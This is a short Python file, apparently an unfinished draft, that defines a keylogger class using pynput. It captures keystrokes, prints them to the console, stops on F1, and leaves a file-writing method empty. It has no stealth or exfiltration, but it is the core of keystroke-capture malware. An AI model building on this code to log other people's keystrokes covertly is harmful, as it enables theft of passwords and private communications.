import platform
import threading
from datetime import datetime
from pynput import keyboard


class KeyLogger:
    def __init__(self, filename: str = "./keylogging.txt"):
        self.discovered_os = platform.system()
        self.start_dt = datetime.now()
        self.filename = filename
        self.listener = None

    def on_press(self, key):
        print(key)
        if key == keyboard.Key.f1:
            self.stop_listening()

    def start_listening(self):
        self.listener = keyboard.Listener(
            on_press=self.on_press
        )
        self.listener.start()

    def stop_listening(self):
        self.listener.stop()

    def write_to_file(self):
        None


def main():
    key_logger = KeyLogger()
    key_logger.start_listening()
    input()


if __name__ == "__main__":
    main()
